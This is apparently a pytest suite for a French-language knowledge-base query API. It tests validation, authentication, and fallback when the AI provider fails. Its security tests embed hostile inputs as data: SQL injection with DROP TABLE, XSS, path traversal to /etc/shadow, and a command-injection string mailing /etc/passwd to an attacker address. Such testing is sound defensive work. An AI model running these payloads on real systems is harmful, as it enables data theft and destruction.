import asyncio
import logging
import pytest
import httpx
from unittest.mock import AsyncMock, patch
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.exc import OperationalError

from app.config import settings
from app.models import KnowledgeArticle
from app.services.knowledge_base import KnowledgeBaseService
from app.services.ai_assistant import AIAssistantService
from tests.conftest import TEST_API_KEY


@pytest.mark.asyncio
async def test_query_happy_path_returns_matched_article(app_test_env, caplog):
    """
    1. FUNCTIONAL - Happy Path:
    A question matching a knowledge base article returns HTTP 200, found=True,
    the exact solution and the article ID.
    Checks the HTTP response, the database state and the logs.
    """
    client, session_maker, _ = app_test_env

    # Setup DB
    async with session_maker() as session:
        article = await KnowledgeBaseService.add_article(
            session=session,
            question="Comment configurer le proxy corporate ?",
            solution="Définir HTTPS_PROXY dans votre environnement.",
            keywords="proxy, corporate, reseau, configuration",
        )
        article_id = article.id

    # HTTP request
    with caplog.at_level(logging.INFO):
        response = await client.post(
            "/api/query",
            json={"query": "Comment je peux configurer mon proxy corporate ?", "user_id": 12345},
        )

    # 4. ASSERTIONS
    assert response.status_code == 200
    data = response.json()
    assert data["found"] is True
    assert data["confidence"] >= settings.KB_CONFIDENCE_THRESHOLD
    assert "Définir HTTPS_PROXY" in data["answer"]
    assert data["article_id"] == article_id
    assert data["requires_resolution_confirmation"] is True

    # Check the DB state (unchanged by a read)
    async with session_maker() as session:
        db_art = (await session.execute(select(KnowledgeArticle).where(KnowledgeArticle.id == article_id))).scalar_one()
        assert db_art.solution == "Définir HTTPS_PROXY dans votre environnement."


@pytest.mark.asyncio
async def test_query_no_match_returns_fallback_message(app_test_env):
    """
    1. FUNCTIONAL - Fallback:
    A question with no match in the KB returns 200,
    found=False, confidence=0.0 and the support fallback message.
    """
    client, session_maker, _ = app_test_env

    response = await client.post(
        "/api/query",
        json={"query": "Quelle est la météo sur Jupiter aujourd'hui ?"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["found"] is False
    assert data["confidence"] == 0.0
    assert "équipe support" in data["answer"]
    assert data["article_id"] is None
    assert data["requires_resolution_confirmation"] is True


@pytest.mark.asyncio
async def test_query_min_length_one_char_returns_success(app_test_env):
    """
    1. FUNCTIONAL - Min edge case:
    A 1-character query (e.g. '?') must be accepted by Pydantic validation.
    """
    client, _, _ = app_test_env
    response = await client.post("/api/query", json={"query": "?"})
    assert response.status_code == 200
    assert "answer" in response.json()


@pytest.mark.asyncio
async def test_query_empty_string_returns_422_validation_error(app_test_env):
    """
    1. FUNCTIONAL - Empty edge case:
    An empty query ("") violates min_length=1 and must return 422 Unprocessable Entity.
    """
    client, _, _ = app_test_env
    response = await client.post("/api/query", json={"query": ""})
    assert response.status_code == 422
    errors = response.json().get("detail", [])
    assert any("query" in str(err.get("loc", [])) for err in errors)


@pytest.mark.asyncio
async def test_query_whitespace_only_returns_fallback_answer(app_test_env):
    """
    1. FUNCTIONAL - Whitespace edge case:
    A query made only of spaces passes Pydantic validation
    but is trimmed by QueryOrchestrator, which asks the user to ask a question.
    """
    client, _, _ = app_test_env
    response = await client.post("/api/query", json={"query": "   "})
    assert response.status_code == 200
    data = response.json()
    assert data["found"] is False
    assert "Veuillez poser une question" in data["answer"]


@pytest.mark.asyncio
async def test_query_max_length_4096_returns_success(app_test_env):
    """
    1. FUNCTIONAL - Max edge case:
    A 4096-character query (the allowed limit) is accepted.
    """
    client, _, _ = app_test_env
    long_query = "a" * 4096
    response = await client.post("/api/query", json={"query": long_query})
    assert response.status_code == 200


@pytest.mark.asyncio
async def test_query_exceeds_max_length_returns_422_validation_error(app_test_env):
    """
    1. FUNCTIONAL - Input validation:
    A 4097-character query must be rejected with 422.
    """
    client, _, _ = app_test_env
    too_long = "a" * 4097
    response = await client.post("/api/query", json={"query": too_long})
    assert response.status_code == 422


@pytest.mark.asyncio
async def test_query_unicode_and_emojis_matches_correctly(app_test_env):
    """
    1. FUNCTIONAL - Unicode / special characters:
    Full support for accented French characters, emojis and non-Latin alphabets.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Comment réinitialiser la clé d'authentification ? 🔑",
            solution="Cliquez sur l'icône ⚙️ puis Régénérer la clé.",
            keywords="réinitialiser, clé, authentification, securité",
        )

    response = await client.post(
        "/api/query",
        json={"query": "Je voudrais réinitialiser ma clé d'authentification 🔑 !"},
    )
    assert response.status_code == 200
    data = response.json()
    assert data["found"] is True
    assert "Régénérer la clé" in data["answer"]


@pytest.mark.asyncio
async def test_query_idempotence_multiple_calls_returns_identical_response(app_test_env):
    """
    1. FUNCTIONAL - Idempotence:
    Calling the endpoint several times with the same parameters produces exactly
    the same result with no unwanted side effect.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Procédure de sauvegarde",
            solution="Exécutez backup.sh chaque soir.",
            keywords="sauvegarde, backup",
        )

    resp1 = await client.post("/api/query", json={"query": "Comment faire une sauvegarde ?"})
    resp2 = await client.post("/api/query", json={"query": "Comment faire une sauvegarde ?"})
    resp3 = await client.post("/api/query", json={"query": "Comment faire une sauvegarde ?"})

    assert resp1.status_code == 200
    assert resp1.json() == resp2.json() == resp3.json()


# ==============================================================================
# 2. SECURITY
# ==============================================================================


@pytest.mark.asyncio
async def test_query_sql_injection_attempt_sanitized_safely(app_test_env):
    """
    2. SECURITY - SQL injection:
    A classic SQL injection payload (`' OR '1'='1`, `'; DROP TABLE...`)
    causes no database corruption and no leak of unauthorized data.
    """
    client, session_maker, _ = app_test_env
    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Procédure standard",
            solution="Solution valide.",
            keywords="standard",
        )

    sql_payloads = [
        "' OR '1'='1",
        "'; DROP TABLE knowledge_articles; --",
        "' UNION SELECT id, question, solution, keywords, NULL, created_at, updated_at FROM knowledge_articles --",
        "admin'--",
    ]

    for payload in sql_payloads:
        response = await client.post("/api/query", json={"query": payload})
        assert response.status_code == 200
        # The table must still exist and be intact
        async with session_maker() as session:
            count = len((await session.execute(select(KnowledgeArticle))).scalars().all())
            assert count >= 1


@pytest.mark.asyncio
async def test_query_xss_injection_payload_reflected_safely(app_test_env):
    """
    2. SECURITY - XSS:
    An XSS payload (`<script>alert(1)</script>`) is returned as serialized
    JSON, without HTML interpretation.
    """
    client, _, _ = app_test_env
    xss = "<script>alert('xss')</script><img src=x onerror=alert(1)>"
    response = await client.post("/api/query", json={"query": xss})
    assert response.status_code == 200
    data = response.json()
    assert response.headers["content-type"].startswith("application/json")
    assert data["query"] == xss


@pytest.mark.asyncio
async def test_query_command_injection_payload_treated_as_plain_text(app_test_env):
    """
    2. SECURITY - Command injection:
    Shell metacharacters (`$(whoami)`, `; rm -rf`, `| id`)
    are treated as plain text and run no OS command.
    """
    client, _, _ = app_test_env
    cmd = "; cat /etc/passwd | mail evil@attacker.com; $(id)"
    response = await client.post("/api/query", json={"query": cmd})
    assert response.status_code == 200
    assert response.json()["found"] is False


@pytest.mark.asyncio
async def test_query_path_traversal_payload_handled_safely(app_test_env):
    """
    2. SECURITY - Path traversal:
    Sequences such as `../../../../etc/passwd` or `..\\..\\windows\\system32`
    do not leak any local file.
    """
    client, _, _ = app_test_env
    traversal = "../../../../etc/shadow"
    response = await client.post("/api/query", json={"query": traversal})
    assert response.status_code == 200
    assert "root:" not in response.text


@pytest.mark.asyncio
async def test_query_missing_api_key_returns_401_unauthorized(unauth_client):
    """
    2. SECURITY - Authz / Headers:
    A call without the X-API-Key header must be rejected with 401 Unauthorized.
    """
    response = await unauth_client.post("/api/query", json={"query": "Test query"})
    assert response.status_code == 401
    assert "X-API-Key" in response.json()["detail"]


@pytest.mark.asyncio
async def test_query_invalid_api_key_returns_401_unauthorized(unauth_client):
    """
    2. SECURITY - Authz / Headers:
    A call with an invalid key must return 401.
    """
    response = await unauth_client.post(
        "/api/query",
        json={"query": "Test query"},
        headers={"X-API-Key": "mauvaise-cle-pirate"},
    )
    assert response.status_code == 401


@pytest.mark.asyncio
async def test_query_unconfigured_api_key_returns_503_service_unavailable(app_test_env, monkeypatch):
    """
    2. SECURITY - Fail-closed:
    If API_KEY is not configured on the server, access must fail safely (503).
    """
    client, _, _ = app_test_env
    monkeypatch.setattr(settings, "API_KEY", None)
    response = await client.post("/api/query", json={"query": "Test query"})
    assert response.status_code == 503
    assert "API_KEY missing" in response.json()["detail"]


@pytest.mark.asyncio
async def test_query_secrets_not_leaked_in_logs(app_test_env, caplog):
    """
    2. SECURITY - Secrets in logs:
    No log emitted during the request contains the secret API_KEY.
    """
    client, _, _ = app_test_env
    with caplog.at_level(logging.DEBUG):
        await client.post("/api/query", json={"query": "Test secret leakage check"})

    for record in caplog.records:
        assert TEST_API_KEY not in record.getMessage()


# ==============================================================================
# 3. ROBUSTESSE
# ==============================================================================


@pytest.mark.asyncio
async def test_query_concurrent_requests_handled_correctly(app_test_env):
    """
    3. ROBUSTNESS - Concurrency:
    15 concurrent requests run at the same time without deadlock
    or state corruption in SQLite.
    """
    client, session_maker, _ = app_test_env

    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Question concourante",
            solution="Réponse concourante.",
            keywords="concurrence",
        )

    async def single_req(idx: int):
        return await client.post(
            "/api/query",
            json={"query": f"Question concourante {idx}", "user_id": 1000 + idx},
        )

    results = await asyncio.gather(*(single_req(i) for i in range(15)))
    assert all(r.status_code == 200 for r in results)
    assert all(r.json()["found"] is True for r in results)


@pytest.mark.asyncio
async def test_query_ai_provider_timeout_falls_back_to_raw_kb_answer(app_test_env, monkeypatch):
    """
    3. ROBUSTNESS - External dependency timeout:
    If the external AI service times out (network boundary), the orchestrator
    must gracefully fall back to the raw knowledge base solution without crashing.
    """
    client, session_maker, _ = app_test_env
    monkeypatch.setattr(settings, "AI_ENABLED", True)
    monkeypatch.setattr(settings, "AI_API_KEY", "dummy-ai-key")

    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Comment sauvegarder la base ?",
            solution="Solution brute de secours depuis la base.",
            keywords="sauvegarder, base",
        )

    # Mock the AI network boundary timing out
    async def mock_timeout_post(*args, **kwargs):
        raise httpx.TimeoutException("AI provider gateway timed out")

    mock_client = AsyncMock()
    mock_client.post = mock_timeout_post
    AIAssistantService.set_shared_client(mock_client)

    try:
        response = await client.post("/api/query", json={"query": "Comment sauvegarder la base ?"})
        assert response.status_code == 200
        data = response.json()
        assert data["found"] is True
        # The raw solution is kept despite the AI outage
        assert data["answer"] == "Solution brute de secours depuis la base."
    finally:
        AIAssistantService.set_shared_client(None)


@pytest.mark.asyncio
async def test_query_ai_provider_network_failure_falls_back_to_raw_kb_answer(app_test_env, monkeypatch, caplog):
    """
    3. ROBUSTNESS - External dependency failure (500/502):
    When the external LLM API returns an HTTP 500 error, the backend logs the error
    and returns the KB answer without interrupting the service.
    """
    client, session_maker, _ = app_test_env
    monkeypatch.setattr(settings, "AI_ENABLED", True)
    monkeypatch.setattr(settings, "AI_API_KEY", "dummy-ai-key")

    async with session_maker() as session:
        await KnowledgeBaseService.add_article(
            session=session,
            question="Comment configurer le VPN ?",
            solution="Ouvrez le client OpenVPN et importez le profil.",
            keywords="vpn, openvpn, profil",
        )

    mock_resp = httpx.Response(status_code=500, text="Internal Server Error from LLM")
    mock_client = AsyncMock()
    mock_client.post.return_value = mock_resp
    AIAssistantService.set_shared_client(mock_client)

    try:
        with caplog.at_level(logging.WARNING):
            response = await client.post("/api/query", json={"query": "Comment configurer le VPN ?"})

        assert response.status_code == 200
        data = response.json()
        assert data["found"] is True
        assert "Ouvrez le client OpenVPN" in data["answer"]
        assert any("AI provider error" in rec.getMessage() for rec in caplog.records)
    finally:
        AIAssistantService.set_shared_client(None)
